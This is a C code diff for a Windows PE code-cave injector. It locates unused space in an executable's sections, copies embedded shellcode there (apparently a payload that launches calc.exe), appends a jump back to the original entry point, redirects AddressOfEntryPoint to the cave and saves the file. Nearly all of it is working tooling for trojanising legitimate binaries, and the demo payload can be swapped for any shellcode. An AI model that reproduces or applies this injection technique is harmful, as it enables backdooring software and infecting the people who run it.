@@ -8,7 +8,7 @@ typedef struct _CAVE_INFO
 	DWORD dwSize;
 } CAVE_INFO, * PCAVE_INFO;
 
-int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD *offset)
+int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD *caveOffset, DWORD *caveRVA)
 {
 	PBYTE pSectionStart = pBuffer + pSectionHeader->PointerToRawData;
 	DWORD dwSectionSize = pSectionHeader->SizeOfRawData;
@@ -72,22 +72,25 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, DWORD 
 	{
 		printf("Cave [%d]:\n", i);
 		printf("  Start Address: 0x%p\n", caveInfo[i].pStartAddress);
+		//printf("  Previous Byte: 0x%02X\n", *(PBYTE*)(caveInfo[i].pStartAddress - 1));
 		printf("  End Address: 0x%p\n", caveInfo[i].pEndAddress);
 		printf("  Size: %d bytes\n", caveInfo[i].dwSize);
 		DWORD caveSectionOffset = (DWORD)(caveInfo[i].pStartAddress - pSectionStart);
-		DWORD caveRVA = pSectionHeader->VirtualAddress + caveSectionOffset;
-		printf("  Offset: 0x%04X\n", caveRVA);
+		DWORD rva = pSectionHeader->VirtualAddress + caveSectionOffset;
+		DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
+		printf("  RVA: 0x%04X\n", rva);
+		printf("  Offset: 0x%04X\n", caveFileOffset);
 		// TODO: Grab largest cave or give user option to select cave instead of just grabbing the last one.
-		*offset = caveRVA;
+		*caveOffset = caveFileOffset;
+		*caveRVA = rva;
 	}
 
 	return 0;
 }
 
-void generatePayload()
+void generatePayload(DWORD originalEntryPoint, DWORD caveRVA, PBYTE pCaveAddress)
 {
-	unsigned char saveReg[] = { 0x60, 0x9C }; // pushad; pushfd
-	unsigned char sc[] = {0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
+	unsigned char payload[] = {0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
 		0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
 		0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
 		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
@@ -105,10 +108,20 @@ void generatePayload()
 		0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61,
 		0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00};
 
-	unsigned char payload[sizeof(saveReg) + sizeof(sc)];
 
-	memcpy(payload, saveReg, sizeof(saveReg));
-	memcpy(payload + sizeof(saveReg), sc, sizeof(sc));
+	DWORD scSize = sizeof(payload);
+
+	printf("[+] Size of shellcode: %d\n", scSize);
+
+	printf("[+] Adding shellcode to code cave\n");
+	memcpy((void*)pCaveAddress, payload, scSize);
+
+	printf("Adding patch back to original entrypoint RVA\n");
+	DWORD jmpRVA = caveRVA + sizeof(payload);
+	DWORD rel32 = (DWORD)(originalEntryPoint - (jmpRVA + 5));
+
+	pCaveAddress[scSize] = 0xE9; // jmp
+	*(DWORD*)(pCaveAddress + scSize + 1) = rel32;
 
 	for (int i = 0; i < sizeof(payload); i++)
 	{
@@ -144,8 +157,6 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	//PBYTE pBuffer = NULL;
-
 	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
@@ -170,36 +181,16 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	/*
-	DWORD dwFileSize = GetFileSize(hFile, NULL);
-	printf("[+] File size: %d bytes\n", dwFileSize);
-
-	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
-	
-	if (pBuffer == NULL)
-	{
-		printf("[*] Error allocating memory: %d\n", GetLastError());
-		CloseHandle(hFile);
-		return 1;
-	}
-
-	if (!ReadFile(hFile, pBuffer, dwFileSize, NULL, NULL))
-	{
-		printf("[*] Error reading bytes into memory: %d\n", GetLastError());
-		CloseHandle(hFile);
-		return 1;
-	}
-	*/
-
 	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
 	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pBuffer + pDosHeader->e_lfanew);
-	ULONG_PTR entryPoint = (ULONG_PTR)pBuffer + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
+	DWORD originalEntryPoint = pNTHeaders->OptionalHeader.AddressOfEntryPoint;
 
 	printf("[+] Buffer: 0x%p\n", (void*)pBuffer);
-
+	printf("[+] EntryPoint RVA: 0x%04X\n", originalEntryPoint);
 
 	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);
-	DWORD offset = 0;
+	DWORD caveOffset = 0;
+	DWORD caveRVA = 0;
 
 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
 	{
@@ -214,14 +205,22 @@ int main(int argc, char *argv[])
 			printf("    [*] Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
 			printf("    [*] Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
 			printf("    [*] Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
-			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &offset);
+			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &caveOffset, &caveRVA);
 		}
 	}
 
-	printf("Cave offset: 0x%02x\n", offset);
+	printf("[+] Updating entrypoint to code cave offset\n");
+	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveRVA;
 
-	generatePayload();
+	printf("[+] New EntryPoint RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
+	PBYTE caveAddress = (PBYTE)pBuffer + caveOffset;
+
+	generatePayload(originalEntryPoint, caveRVA, caveAddress);
+
+	printf("[+] Saving modifications\n");
+
+	FlushViewOfFile(pBuffer, 0);
 	UnmapViewOfFile(pBuffer);
 	CloseHandle(hMap);
 	CloseHandle(hFile);
